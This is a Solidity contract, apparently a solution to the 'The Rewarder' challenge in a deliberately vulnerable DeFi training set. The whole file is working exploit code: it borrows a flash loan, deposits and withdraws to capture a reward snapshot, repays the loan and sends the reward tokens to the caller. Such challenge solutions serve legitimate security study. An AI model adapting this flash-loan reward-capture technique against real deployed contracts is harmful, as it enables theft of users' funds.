pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
// import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract TheRewarderExploit {
    TheRewarderPool rewardPool;
    address caller;

    function exploit(FlashLoanerPool flashLoan, TheRewarderPool _rewardPool, uint256 amount, address to) external {
        caller = to;
        rewardPool = _rewardPool;
        flashLoan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken dvt = rewardPool.liquidityToken();
        dvt.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        dvt.transfer(msg.sender, amount);
        RewardToken rt = rewardPool.rewardToken();
        rt.transfer(caller, rt.balanceOf(address(this)));
    }
}